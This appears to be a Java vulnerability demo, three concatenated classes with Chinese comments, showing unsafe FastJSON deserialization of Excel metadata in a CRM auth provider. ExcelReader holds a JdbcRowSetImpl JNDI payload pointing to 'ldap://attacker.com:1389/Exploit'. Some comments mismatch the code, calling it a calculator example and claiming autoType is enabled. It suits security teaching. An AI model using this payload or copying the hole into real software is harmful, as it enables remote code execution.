package com.crm.auth;

import com.alibaba.fastjson.JSON;
import com.crm.excel.ExcelReader;
import com.crm.util.JsonUtils;
import java.io.File;
import java.util.Map;

public class AuthProvider {
    private AuthProviderConfig config;

    public void initAuthProvider(String excelFilePath) {
        ExcelReader reader = new ExcelReader();
        Map<String, String> excelMetadata = reader.readMetadata(excelFilePath);
        
        // 漏洞点：直接反序列化不可信的Excel元数据
        String configJson = excelMetadata.get("columnComment");
        this.config = JsonUtils.jsonToObject(configJson, AuthProviderConfig.class);
    }

    public boolean validateAccess(String token) {
        return config.checkPermission(token);
    }

    public static void main(String[] args) {
        AuthProvider provider = new AuthProvider();
        // 模拟上传恶意Excel文件
        provider.initAuthProvider("/tmp/malicious_report.xlsx");
        provider.validateAccess("dummy_token");
    }
}

// 反序列化目标类
class AuthProviderConfig {
    private String permissionLevel;

    public boolean checkPermission(String token) {
        // 实际业务逻辑应为token验证，此处简化演示
        return "admin".equals(permissionLevel);
    }

    // FastJSON反序列化需要的setter方法
    public void setPermissionLevel(String permissionLevel) {
        this.permissionLevel = permissionLevel;
    }
}

// JSON工具类（存在漏洞的实现）
package com.crm.util;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONException;

public class JsonUtils {
    public static <T> T jsonToObject(String json, Class<T> clazz) {
        try {
            // 危险：未限制反序列化类型且启用autoType
            return JSON.parseObject(json, clazz);
        } catch (JSONException e) {
            System.err.println("JSON解析失败: " + e.getMessage());
            return null;
        }
    }
}

// Excel处理模拟类
package com.crm.excel;

import java.util.HashMap;
import java.util.Map;

public class ExcelReader {
    public Map<String, String> readMetadata(String filePath) {
        Map<String, String> metadata = new HashMap<>();
        // 模拟读取被污染的Excel元数据
        if (filePath.contains("malicious")) {
            // 构造恶意JSON payload（示例为Windows计算器）
            String evilJson = "{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"ldap://attacker.com:1389/Exploit\\",\\"autoCommit\\":true}";
            metadata.put("columnComment", evilJson);
        }
        return metadata;
    }
}